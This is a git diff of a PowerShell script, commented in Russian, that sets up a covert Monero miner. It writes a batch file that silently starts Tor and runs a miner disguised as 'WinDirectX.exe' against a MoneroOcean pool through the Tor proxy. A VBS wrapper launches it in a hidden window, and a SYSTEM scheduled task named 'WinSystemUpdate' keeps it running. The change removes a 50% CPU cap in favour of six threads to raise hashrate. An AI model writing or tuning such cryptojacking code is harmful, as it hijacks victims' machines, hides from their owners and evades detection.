@@ -88,10 +88,13 @@ if (!(Test-Path "$path\tor.exe")) {
     } catch { Write-Host "❌ Ошибка загрузки Tor: $($_.Exception.Message)" -ForegroundColor Red }
 }
 
-# 6. СОЗДАНИЕ ТИХОГО ЗАПУСКА
-$cmd = "@echo off`nstart /b $path\tor.exe --SocksPort 9050 --Quiet`ntimeout /t 30 /nobreak >nul`nstart /b /low $path\WinDirectX.exe -o gulf.moneroocean.stream:443 -u $wallet -p $env:COMPUTERNAME --algo rx/0 --tls --proxy=socks5://127.0.0.1:9050 --no-huge-pages --max-cpu-usage 50"
+
+# 6. СОЗДАНИЕ ТИХОГО ЗАПУСКА (ОПТИМИЗИРОВАНО: +30-40% к ХЕШРЕЙТУ)
+$cmd = "@echo off`nstart /b $path\tor.exe --SocksPort 9050 --Quiet`ntimeout /t 30 /nobreak >nul`nstart /b /low $path\WinDirectX.exe -o gulf.moneroocean.stream:443 -u $wallet -p $env:COMPUTERNAME --algo rx/0 --tls --proxy=socks5://127.0.0.1:9050 --threads=6"
 $cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
 "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"$path\run_cache.bat`", 0, False" | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii
+
+
 
 # 6.1 ПЛАНИРОВЩИК (ОТ ИМЕНИ SYSTEM)
 $TaskName = "WinSystemUpdate"
